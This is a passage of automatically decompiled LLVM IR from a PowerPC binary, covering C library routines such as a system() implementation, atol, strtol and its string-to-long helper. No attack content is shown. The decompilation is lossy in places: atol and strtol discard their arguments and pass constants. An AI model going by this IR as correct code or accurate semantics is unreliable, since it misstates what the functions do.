  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000ee00 = icmp ugt i32 %arg2, 127
  %v0_1000ee08 = load i32, i32* @lr, align 4
  store i32 %v0_1000ee08, i32* %r0.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v1_1000ee14 = sub i32 255, %arg2
  %v2_1000ee14 = sub i32 -1, %arg2
  %not.v5_1000ee14 = icmp ugt i32 %v1_1000ee14, %v2_1000ee14
  %v6_1000ee18 = sext i1 %not.v5_1000ee14 to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_1000ee20 = add i32 %tmp, 4
  store i32 %v1_1000ee20, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001d494.892 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_1000ee38 = sub nsw i32 3, %v6_1000ee18
  store i32 %v1_1000ee38, i32* @r31, align 4
  br i1 %v2_1000ee00, label %dec_label_pc_1000ee60, label %dec_label_pc_1000ee40

dec_label_pc_1000ee40:                            ; preds = %entry
  %v2_1000ee2c = icmp ugt i32 %arg2, 31
  %v1_1000ee40 = sub i32 63, %arg2
  %not.v5_1000ee40 = icmp ugt i32 %v1_1000ee40, %v2_1000ee14
  %v6_1000ee44 = sext i1 %not.v5_1000ee40 to i32
  %v1_1000ee4c = sub nsw i32 1, %v6_1000ee44
  store i32 %v1_1000ee4c, i32* @r31, align 4
  br i1 %v2_1000ee2c, label %dec_label_pc_1000ee60, label %dec_label_pc_1000ee54

dec_label_pc_1000ee54:                            ; preds = %dec_label_pc_1000ee40
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_1000eec0, label %dec_label_pc_1000ee60

dec_label_pc_1000ee60:                            ; preds = %dec_label_pc_1000ee54, %dec_label_pc_1000ee40, %entry
  %v0_1000ee60 = phi i32 [ 0, %dec_label_pc_1000ee54 ], [ %v1_1000ee4c, %dec_label_pc_1000ee40 ], [ %v1_1000ee38, %entry ]
  %v1_1000ee60 = mul nsw i32 %v0_1000ee60, 4
  store i32 %v1_1000ee60, i32* %r0.global-to-local, align 4
  %v2_1000ee64 = add i32 %arg3, 12
  %v3_1000ee64 = inttoptr i32 %v2_1000ee64 to i32*
  store i32 %v0_1000ee60, i32* %v3_1000ee64, align 4
  %v0_1000ee68 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ee68 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000ee68 = add i32 %v1_1000ee68, %v0_1000ee68
  store i32 %v2_1000ee68, i32* %r9.global-to-local, align 4
  %v3_1000ee6c = inttoptr i32 %v2_1000ee68 to i32*
  %v4_1000ee6c = load i32, i32* %v3_1000ee6c, align 4
  store i32 %v4_1000ee6c, i32* %r0.global-to-local, align 4
  %v1_1000ee70 = add i32 %v2_1000ee68, 20
  %v2_1000ee70 = inttoptr i32 %v1_1000ee70 to i32*
  %v3_1000ee70 = load i32, i32* %v2_1000ee70, align 4
  store i32 %v3_1000ee70, i32* %r9.global-to-local, align 4
  %v1_1000ee74 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000ee74 = add i32 %v1_1000ee74, 20
  %v3_1000ee74 = inttoptr i32 %v2_1000ee74 to i32*
  store i32 %v4_1000ee6c, i32* %v3_1000ee74, align 4
  %v0_1000ee78 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ee78 = mul i32 %v0_1000ee78, 4
  store i32 %v1_1000ee78, i32* %r0.global-to-local, align 4
  %v0_1000ee7c = load i32, i32* %r29.global-to-local, align 4
  %v1_1000ee7c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000ee7c = add i32 %v1_1000ee7c, 8
  %v3_1000ee7c = inttoptr i32 %v2_1000ee7c to i32*
  store i32 %v0_1000ee7c, i32* %v3_1000ee7c, align 4
  %v0_1000ee80 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000ee80 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000ee80 = add i32 %v1_1000ee80, %v0_1000ee80
  store i32 %v2_1000ee80, i32* %r0.global-to-local, align 4
  %v0_1000ee84 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ee84 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000ee84 = add i32 %v1_1000ee84, 16
  %v3_1000ee84 = inttoptr i32 %v2_1000ee84 to i32*
  store i32 %v0_1000ee84, i32* %v3_1000ee84, align 4
  %v0_1000ee88 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ee88 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000ee88 = add i32 %v1_1000ee88, 24
  %v3_1000ee88 = inttoptr i32 %v2_1000ee88 to i32*
  store i32 %v0_1000ee88, i32* %v3_1000ee88, align 4
  store i32 268496528, i32* @lr, align 4
  %v0_1000ee8c = call i32 @srandom_r()
  %v0_1000ee90 = load i32, i32* @r31, align 4
  %v3_1000ee90 = icmp eq i32 %v0_1000ee90, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000ee9c = load i32, i32* %r27.global-to-local, align 4
  %v2_1000ee9c = inttoptr i32 %v1_1000ee9c to i32*
  store i32 0, i32* %v2_1000ee9c, align 4
  br i1 %v3_1000ee90, label %dec_label_pc_1000eed4, label %dec_label_pc_1000eea4

dec_label_pc_1000eea4:                            ; preds = %dec_label_pc_1000ee60
  %v0_1000eea4 = load i32, i32* @r30, align 4
  %v1_1000eea4 = add i32 %v0_1000eea4, 4
  %v2_1000eea4 = inttoptr i32 %v1_1000eea4 to i32*
  %v3_1000eea4 = load i32, i32* %v2_1000eea4, align 4
  %v0_1000eea8 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000eea8 = sub i32 %v3_1000eea4, %v0_1000eea8
  %v4_1000eeac = sdiv i32 %v2_1000eea8, 4
  %v1_1000eeb0 = mul i32 %v4_1000eeac, 5
  %v1_1000eeb4 = load i32, i32* @r31, align 4
  %v2_1000eeb4 = add i32 %v1_1000eeb0, %v1_1000eeb4
  store i32 %v2_1000eeb4, i32* %r0.global-to-local, align 4
  %v1_1000eeb8 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000eeb8 = inttoptr i32 %v1_1000eeb8 to i32*
  store i32 %v2_1000eeb4, i32* %v2_1000eeb8, align 4
  br label %dec_label_pc_1000eed4

dec_label_pc_1000eec0:                            ; preds = %dec_label_pc_1000ee54
  %v0_1000eec0 = call i32 @__errno_location()
  store i32 %v0_1000eec0, i32* %r3.global-to-local, align 4
  %v0_1000eec4 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000eec4 = inttoptr i32 %v0_1000eec0 to i32*
  store i32 %v0_1000eec4, i32* %v2_1000eec4, align 4
  %v0_1000eec8 = call i32 @__errno_location()
  %v0_1000eecc = load i32, i32* %r28.global-to-local, align 4
  %v2_1000eecc = inttoptr i32 %v0_1000eec8 to i32*
  store i32 %v0_1000eecc, i32* %v2_1000eecc, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000eed4

dec_label_pc_1000eed4:                            ; preds = %dec_label_pc_1000ee60, %dec_label_pc_1000eea4, %dec_label_pc_1000eec0
  store i32 %v0_1000ee08, i32* %r0.global-to-local, align 4
  %v0_1000eee4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000eee4

; uselistorder directives
  uselistorder i32 %v2_1000ee68, { 1, 0, 2 }
  uselistorder i32 %v0_1000ee60, { 1, 0 }
  uselistorder i32 %v2_1000ee14, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001d494.892 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_1000eed4, { 2, 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000eef0 = load i32, i32* @r31, align 4
  %v3_1000eef8 = icmp eq i32 %arg1, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000eef8, label %dec_label_pc_1000f028, label %dec_label_pc_1000ef08

dec_label_pc_1000ef08:                            ; preds = %entry
  store i32 268496660, i32* @lr, align 4
  %v2_1000ef10 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268496676, i32* @lr, align 4
  %v2_1000ef20 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 268496692, i32* @lr, align 4
  %v2_1000ef30 = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_1000ef30, i32* @r3, align 4
  store i32 268496700, i32* @lr, align 4
  %v0_1000ef38 = call i32 @__vfork()
  store i32 %v0_1000ef38, i32* @r31, align 4
  %tmp10 = icmp sgt i32 %v0_1000ef38, -1
  br i1 %tmp10, label %dec_label_pc_1000ef70, label %dec_label_pc_1000ef44

dec_label_pc_1000ef44:                            ; preds = %dec_label_pc_1000ef08
  store i32 268496720, i32* @lr, align 4
  %v2_1000ef4c = call i32 @__bsd_signal(i32 3, i32 %v2_1000ef10)
  store i32 268496732, i32* @lr, align 4
  %v2_1000ef58 = call i32 @__bsd_signal(i32 2, i32 %v2_1000ef20)
  store i32 268496744, i32* @lr, align 4
  %v2_1000ef64 = call i32 @__bsd_signal(i32 17, i32 %v2_1000ef30)
  br label %dec_label_pc_1000f028

dec_label_pc_1000ef70:                            ; preds = %dec_label_pc_1000ef08
  %v3_1000ef3c = icmp eq i32 %v0_1000ef38, 0
  br i1 %v3_1000ef3c, label %dec_label_pc_1000ef74, label %dec_label_pc_1000efc8

dec_label_pc_1000ef74:                            ; preds = %dec_label_pc_1000ef70
  store i32 268496768, i32* @lr, align 4
  %v2_1000ef7c = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 268496780, i32* @lr, align 4
  %v2_1000ef88 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 268496792, i32* @lr, align 4
  %v2_1000ef94 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_1000efbc = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1001d4bc.894 to i32), i32 ptrtoint ([3 x i8]* @global_var_1001d4c4.895 to i32), i32 ptrtoint ([3 x i8]* @global_var_1001d4c8.896 to i32), i32 %arg1, i32 0)
  %v1_1000efc4 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_1000efc8

dec_label_pc_1000efc8:                            ; preds = %dec_label_pc_1000ef70, %dec_label_pc_1000ef74
  store i32 268496852, i32* @lr, align 4
  %v2_1000efd0 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268496864, i32* @lr, align 4
  %v2_1000efdc = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_1000efe0 = load i32, i32* @r31, align 4
  store i32 268496884, i32* @lr, align 4
  %v4_1000eff0 = call i32 @wait4(i32 %v0_1000efe0)
  %v3_1000eff4 = icmp eq i32 %v4_1000eff0, -1
  br i1 %v3_1000eff4, label %dec_label_pc_1000effc, label %dec_label_pc_1000f000

dec_label_pc_1000effc:                            ; preds = %dec_label_pc_1000efc8
  store i32 -1, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1000f000

dec_label_pc_1000f000:                            ; preds = %dec_label_pc_1000efc8, %dec_label_pc_1000effc
  store i32 268496908, i32* @lr, align 4
  %v2_1000f008 = call i32 @__bsd_signal(i32 3, i32 %v2_1000ef10)
  store i32 268496920, i32* @lr, align 4
  %v2_1000f014 = call i32 @__bsd_signal(i32 2, i32 %v2_1000ef20)
  store i32 268496932, i32* @lr, align 4
  %v2_1000f020 = call i32 @__bsd_signal(i32 17, i32 %v2_1000ef30)
  %v3_1000f024 = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1000f028

dec_label_pc_1000f028:                            ; preds = %entry, %dec_label_pc_1000ef44, %dec_label_pc_1000f000
  %v0_1000f038 = phi i32 [ 1, %entry ], [ -1, %dec_label_pc_1000ef44 ], [ %v3_1000f024, %dec_label_pc_1000f000 ]
  store i32 %v0_1000eef0, i32* @r31, align 4
  ret i32 %v0_1000f038

; uselistorder directives
  uselistorder i32 %v0_1000ef38, { 1, 0, 2 }
  uselistorder i32 %v2_1000ef30, { 1, 0, 2 }
  uselistorder i32 %v2_1000ef20, { 1, 0 }
  uselistorder i32 %v2_1000ef10, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_1000f028, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f000, { 1, 0 }
  uselistorder label %dec_label_pc_1000efc8, { 1, 0 }
}

define i32 @atol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_1000f044 = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_1000f044
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_1000f04c = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_1000f04c
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000f060 = load i32, i32* @r4, align 4
  store i32 %v0_1000f060, i32* @r25, align 4
  %v0_1000f068 = load i32, i32* @r5, align 4
  store i32 %v0_1000f068, i32* %r30.global-to-local, align 4
  %v0_1000f06c = load i32, i32* @r6, align 4
  store i32 %v0_1000f06c, i32* @r26, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1000f074 = load i32, i32* @global_var_1002e5b0, align 4
  br label %dec_label_pc_1000f080

dec_label_pc_1000f07c:                            ; preds = %dec_label_pc_1000f080
  %v1_1000f07c = add i32 %v0_1000f0b4, 1
  store i32 %v1_1000f07c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000f080

dec_label_pc_1000f080:                            ; preds = %entry, %dec_label_pc_1000f07c
  %v0_1000f0b4 = phi i32 [ %tmp, %entry ], [ %v1_1000f07c, %dec_label_pc_1000f07c ]
  %v1_1000f080 = inttoptr i32 %v0_1000f0b4 to i8*
  %v2_1000f080 = load i8, i8* %v1_1000f080, align 1
  %v3_1000f080 = zext i8 %v2_1000f080 to i32
  %v1_1000f084 = mul nuw nsw i32 %v3_1000f080, 2
  %v2_1000f088 = add i32 %v1_1000f084, %v3_1000f074
  %v3_1000f088 = inttoptr i32 %v2_1000f088 to i16*
  %v4_1000f088 = load i16, i16* %v3_1000f088, align 2
  %v1_1000f08c = and i16 %v4_1000f088, 32
  %v3_1000f08c = icmp eq i16 %v1_1000f08c, 0
  br i1 %v3_1000f08c, label %dec_label_pc_1000f094, label %dec_label_pc_1000f07c

dec_label_pc_1000f094:                            ; preds = %dec_label_pc_1000f080
  %v3_1000f094 = icmp eq i8 %v2_1000f080, 43
  br i1 %v3_1000f094, label %dec_label_pc_1000f0b4, label %dec_label_pc_1000f09c

dec_label_pc_1000f09c:                            ; preds = %dec_label_pc_1000f094
  %v3_1000f09c = icmp eq i8 %v2_1000f080, 45
  store i32 0, i32* @r28, align 4
  br i1 %v3_1000f09c, label %dec_label_pc_1000f0b4, label %dec_label_pc_1000f0b8

dec_label_pc_1000f0b4:                            ; preds = %dec_label_pc_1000f094, %dec_label_pc_1000f09c
  %storemerge = phi i32 [ 1, %dec_label_pc_1000f09c ], [ 0, %dec_label_pc_1000f094 ]
  store i32 %storemerge, i32* @r28, align 4
  %v1_1000f0b4 = add i32 %v0_1000f0b4, 1
  store i32 %v1_1000f0b4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000f0b8

dec_label_pc_1000f0b8:                            ; preds = %dec_label_pc_1000f09c, %dec_label_pc_1000f0b4
  %v1_1000f0b8 = call i32 @__asm_rlwinm.(i32 %v0_1000f068, i32 0, i32 28, i32 26)
  %v4_1000f0b8 = icmp eq i32 %v1_1000f0b8, 0
  br i1 %v4_1000f0b8, label %dec_label_pc_1000f0c4, label %dec_label_pc_1000f0b8.dec_label_pc_1000f100_crit_edge

dec_label_pc_1000f0b8.dec_label_pc_1000f100_crit_edge: ; preds = %dec_label_pc_1000f0b8
  %v0_1000f100.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000f100

dec_label_pc_1000f0c4:                            ; preds = %dec_label_pc_1000f0b8
  %v0_1000f0c4 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000f0c4 = inttoptr i32 %v0_1000f0c4 to i8*
  %v2_1000f0c4 = load i8, i8* %v1_1000f0c4, align 1
  %v0_1000f0c8 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000f0c8 = add i32 %v0_1000f0c8, 10
  store i32 %v1_1000f0c8, i32* %r30.global-to-local, align 4
  %v3_1000f0cc = icmp eq i8 %v2_1000f0c4, 48
  br i1 %v3_1000f0cc, label %dec_label_pc_1000f0d4, label %dec_label_pc_1000f0f4

dec_label_pc_1000f0d4:                            ; preds = %dec_label_pc_1000f0c4
  %v1_1000f0d4 = add i32 %v0_1000f0c4, 1
  %v2_1000f0d4 = inttoptr i32 %v1_1000f0d4 to i8*
  %v3_1000f0d4 = load i8, i8* %v2_1000f0d4, align 1
  %v4_1000f0d4 = zext i8 %v3_1000f0d4 to i32
  store i32 %v1_1000f0d4, i32* %r31.global-to-local, align 4
  %v1_1000f0d8 = add i32 %v0_1000f0c8, 8
  store i32 %v1_1000f0d8, i32* %r30.global-to-local, align 4
  %v1_1000f0dc = or i32 %v4_1000f0d4, 32
  %v3_1000f0e4 = icmp eq i32 %v1_1000f0dc, 120
  br i1 %v3_1000f0e4, label %dec_label_pc_1000f0ec, label %dec_label_pc_1000f0f4

dec_label_pc_1000f0ec:                            ; preds = %dec_label_pc_1000f0d4
  %v1_1000f0ec = mul i32 %v1_1000f0d8, 2
  store i32 %v1_1000f0ec, i32* %r30.global-to-local, align 4
  %v1_1000f0f0 = add i32 %v0_1000f0c4, 2
  store i32 %v1_1000f0f0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000f0f4

dec_label_pc_1000f0f4:                            ; preds = %dec_label_pc_1000f0d4, %dec_label_pc_1000f0c4, %dec_label_pc_1000f0ec
  %v0_1000f1a815 = phi i32 [ %v1_1000f0d4, %dec_label_pc_1000f0ec ], [ %tmp, %dec_label_pc_1000f0c4 ], [ %v1_1000f0d4, %dec_label_pc_1000f0d4 ]
  %v0_1000f0f4 = phi i32 [ %v1_1000f0ec, %dec_label_pc_1000f0ec ], [ %v1_1000f0c8, %dec_label_pc_1000f0c4 ], [ %v1_1000f0d8, %dec_label_pc_1000f0d4 ]
  %tmp22 = icmp slt i32 %v0_1000f0f4, 17
  br i1 %tmp22, label %dec_label_pc_1000f100, label %dec_label_pc_1000f0fc

dec_label_pc_1000f0fc:                            ; preds = %dec_label_pc_1000f0f4
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000f100

dec_label_pc_1000f100:                            ; preds = %dec_label_pc_1000f0b8.dec_label_pc_1000f100_crit_edge, %dec_label_pc_1000f0f4, %dec_label_pc_1000f0fc
  %v0_1000f1a814 = phi i32 [ %tmp, %dec_label_pc_1000f0b8.dec_label_pc_1000f100_crit_edge ], [ %v0_1000f1a815, %dec_label_pc_1000f0f4 ], [ %v0_1000f1a815, %dec_label_pc_1000f0fc ]
  %v1_1000f114 = phi i32 [ %v0_1000f100.pre, %dec_label_pc_1000f0b8.dec_label_pc_1000f100_crit_edge ], [ %v0_1000f0f4, %dec_label_pc_1000f0f4 ], [ 16, %dec_label_pc_1000f0fc ]
  %v1_1000f100 = add i32 %v1_1000f114, -2
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1000f108 = icmp ugt i32 %v1_1000f100, 34
  br i1 %v2_1000f108, label %dec_label_pc_1000f1a0, label %dec_label_pc_1000f110

dec_label_pc_1000f110:                            ; preds = %dec_label_pc_1000f100
  %v2_1000f114 = udiv i32 -1, %v1_1000f114
  store i32 %v2_1000f114, i32* @r29, align 4
  %v2_1000f118 = mul i32 %v2_1000f114, %v1_1000f114
  %v1_1000f11c = sub i32 -1, %v2_1000f118
  %v1_1000f120 = urem i32 %v1_1000f11c, 256
  store i32 %v1_1000f120, i32* @r27, align 4
  %v0_1000f12c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000f12c

dec_label_pc_1000f128:                            ; preds = %dec_label_pc_1000f194, %dec_label_pc_1000f17c
  %v1_1000f130.pre = phi i32 [ %v1_1000f134, %dec_label_pc_1000f194 ], [ %v1_1000f130.pre.pre, %dec_label_pc_1000f17c ]
  %v0_1000f130.pre = phi i32 [ %v2_1000f198, %dec_label_pc_1000f194 ], [ %v0_1000f130.pre.pre, %dec_label_pc_1000f17c ]
  %v0_1000f128 = phi i32 [ %v1_1000f138, %dec_label_pc_1000f194 ], [ %v0_1000f128.pre, %dec_label_pc_1000f17c ]
  br label %dec_label_pc_1000f12c

dec_label_pc_1000f12c:                            ; preds = %dec_label_pc_1000f110, %dec_label_pc_1000f128
  %v0_1000f1a812 = phi i32 [ %v0_1000f1a814, %dec_label_pc_1000f110 ], [ %v0_1000f128, %dec_label_pc_1000f128 ]
  %v0_1000f138 = phi i32 [ %v0_1000f12c.pre, %dec_label_pc_1000f110 ], [ %v0_1000f128, %dec_label_pc_1000f128 ]
  %v1_1000f134 = phi i32 [ %v2_1000f114, %dec_label_pc_1000f110 ], [ %v1_1000f130.pre, %dec_label_pc_1000f128 ]
  %v0_1000f194 = phi i32 [ 0, %dec_label_pc_1000f110 ], [ %v0_1000f130.pre, %dec_label_pc_1000f128 ]
  %v1_1000f12c = inttoptr i32 %v0_1000f138 to i8*
  %v2_1000f12c = load i8, i8* %v1_1000f12c, align 1
  %v3_1000f12c = zext i8 %v2_1000f12c to i32
  %v3_1000f130 = icmp ugt i32 %v0_1000f194, %v1_1000f134
  %v1_1000f138 = add i32 %v0_1000f138, 1
  store i32 %v1_1000f138, i32* %r31.global-to-local, align 4
  %v1_1000f13c = add nsw i32 %v3_1000f12c, -48
  %v1_1000f140 = or i32 %v3_1000f12c, 32
  %v1_1000f144 = urem i32 %v1_1000f13c, 256
  %tmp23 = icmp ult i32 %v1_1000f144, 10
  br i1 %tmp23, label %dec_label_pc_1000f164, label %dec_label_pc_1000f154

dec_label_pc_1000f154:                            ; preds = %dec_label_pc_1000f12c
  %tmp24 = icmp ult i32 %v1_1000f140, 97
  br i1 %tmp24, label %dec_label_pc_1000f164, label %dec_label_pc_1000f160

dec_label_pc_1000f160:                            ; preds = %dec_label_pc_1000f154
  %v1_1000f154 = add nsw i32 %v1_1000f140, -87
  %v1_1000f160 = urem i32 %v1_1000f154, 256
  br label %dec_label_pc_1000f164

dec_label_pc_1000f164:                            ; preds = %dec_label_pc_1000f154, %dec_label_pc_1000f12c, %dec_label_pc_1000f160
  %v1_1000f198 = phi i32 [ 40, %dec_label_pc_1000f154 ], [ %v1_1000f144, %dec_label_pc_1000f12c ], [ %v1_1000f160, %dec_label_pc_1000f160 ]
  %v1_1000f164 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000f164 = icmp slt i32 %v1_1000f198, %v1_1000f164
  br i1 %v2_1000f164, label %dec_label_pc_1000f16c, label %dec_label_pc_1000f1a0

dec_label_pc_1000f16c:                            ; preds = %dec_label_pc_1000f164
  br i1 %v3_1000f130, label %dec_label_pc_1000f17c, label %dec_label_pc_1000f170

dec_label_pc_1000f170:                            ; preds = %dec_label_pc_1000f16c
  %v1_1000f170 = load i32, i32* @r27, align 4
  %v0_1000f174.not = icmp ne i32 %v0_1000f194, %v1_1000f134
  %tmp25 = icmp ule i32 %v1_1000f198, %v1_1000f170
  %or.cond = or i1 %tmp25, %v0_1000f174.not
  br i1 %or.cond, label %dec_label_pc_1000f194, label %dec_label_pc_1000f17c

dec_label_pc_1000f17c:                            ; preds = %dec_label_pc_1000f170, %dec_label_pc_1000f16c
  %v0_1000f17c = call i32 @__errno_location()
  %v0_1000f180 = load i32, i32* @r28, align 4
  %v1_1000f180 = load i32, i32* @r26, align 4
  %v2_1000f180 = and i32 %v1_1000f180, %v0_1000f180
  store i32 %v2_1000f180, i32* @r28, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  %v2_1000f18c = inttoptr i32 %v0_1000f17c to i32*
  store i32 34, i32* %v2_1000f18c, align 4
  %v0_1000f128.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000f130.pre.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f130.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000f128

dec_label_pc_1000f194:                            ; preds = %dec_label_pc_1000f170
  %v2_1000f194 = mul i32 %v1_1000f164, %v0_1000f194
  %v2_1000f198 = add i32 %v2_1000f194, %v1_1000f198
  store i32 %v2_1000f198, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f128

dec_label_pc_1000f1a0:                            ; preds = %dec_label_pc_1000f164, %dec_label_pc_1000f100
  %v0_1000f1a8 = phi i32 [ %v0_1000f1a814, %dec_label_pc_1000f100 ], [ %v0_1000f1a812, %dec_label_pc_1000f164 ]
  %v0_1000f1a0 = load i32, i32* @r25, align 4
  %v3_1000f1a0 = icmp eq i32 %v0_1000f1a0, 0
  br i1 %v3_1000f1a0, label %dec_label_pc_1000f1ac, label %dec_label_pc_1000f1a8

dec_label_pc_1000f1a8:                            ; preds = %dec_label_pc_1000f1a0
  %v2_1000f1a8 = inttoptr i32 %v0_1000f1a0 to i32*
  store i32 %v0_1000f1a8, i32* %v2_1000f1a8, align 4
  br label %dec_label_pc_1000f1ac

dec_label_pc_1000f1ac:                            ; preds = %dec_label_pc_1000f1a0, %dec_label_pc_1000f1a8
  %v0_1000f1ac = load i32, i32* @r26, align 4
  %v3_1000f1ac = icmp eq i32 %v0_1000f1ac, 0
  %v0_1000f1b0 = load i32, i32* @r28, align 4
  %v1_1000f1b0 = sub i32 0, %v0_1000f1b0
  %tmp27 = lshr i32 %v1_1000f1b0, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_1000f1f0.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v3_1000f1ac, label %dec_label_pc_1000f1e0, label %dec_label_pc_1000f1c8

dec_label_pc_1000f1c8:                            ; preds = %dec_label_pc_1000f1ac
  %v3_1000f1c8 = icmp ugt i32 %v0_1000f1f0.pre.pre, %tmp28
  br i1 %v3_1000f1c8, label %dec_label_pc_1000f1d0, label %dec_label_pc_1000f1e0

dec_label_pc_1000f1d0:                            ; preds = %dec_label_pc_1000f1c8
  %v0_1000f1d0 = call i32 @__errno_location()
  %v2_1000f1d8 = inttoptr i32 %v0_1000f1d0 to i32*
  store i32 34, i32* %v2_1000f1d8, align 4
  %v0_1000f1dc = load i32, i32* @r31, align 4
  store i32 %v0_1000f1dc, i32* %r8.global-to-local, align 4
  %v0_1000f1e0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000f1e0

dec_label_pc_1000f1e0:                            ; preds = %dec_label_pc_1000f1ac, %dec_label_pc_1000f1c8, %dec_label_pc_1000f1d0
  %v0_1000f1f0.pre = phi i32 [ %v0_1000f1f0.pre.pre, %dec_label_pc_1000f1c8 ], [ %v0_1000f1dc, %dec_label_pc_1000f1d0 ], [ %v0_1000f1f0.pre.pre, %dec_label_pc_1000f1ac ]
  %v0_1000f1e0 = phi i32 [ %v0_1000f1b0, %dec_label_pc_1000f1c8 ], [ %v0_1000f1e0.pre, %dec_label_pc_1000f1d0 ], [ %v0_1000f1b0, %dec_label_pc_1000f1ac ]
  %v3_1000f1e0 = icmp eq i32 %v0_1000f1e0, 0
  br i1 %v3_1000f1e0, label %dec_label_pc_1000f1ec, label %dec_label_pc_1000f1e8

dec_label_pc_1000f1e8:                            ; preds = %dec_label_pc_1000f1e0
  %v1_1000f1e8 = sub i32 0, %v0_1000f1f0.pre
  store i32 %v1_1000f1e8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f1ec

dec_label_pc_1000f1ec:                            ; preds = %dec_label_pc_1000f1e0, %dec_label_pc_1000f1e8
  %v0_1000f1f0 = phi i32 [ %v1_1000f1e8, %dec_label_pc_1000f1e8 ], [ %v0_1000f1f0.pre, %dec_label_pc_1000f1e0 ]
  ret i32 %v0_1000f1f0

; uselistorder directives
  uselistorder i32 %v0_1000f1f0.pre, { 1, 0 }
  uselistorder i32 %v0_1000f1f0.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1000f198, { 1, 0 }
  uselistorder i32 %v1_1000f144, { 1, 0 }
  uselistorder i32 %v1_1000f140, { 1, 0 }
  uselistorder i32 %v1_1000f138, { 1, 0 }
  uselistorder i32 %v3_1000f12c, { 1, 0 }
  uselistorder i32 %v0_1000f194, { 1, 0, 2 }
  uselistorder i32 %v1_1000f134, { 0, 2, 1 }
  uselistorder i32 %v0_1000f128, { 1, 0 }
  uselistorder i32 %v2_1000f114, { 1, 0, 2 }
  uselistorder i32 %v1_1000f0ec, { 1, 0 }
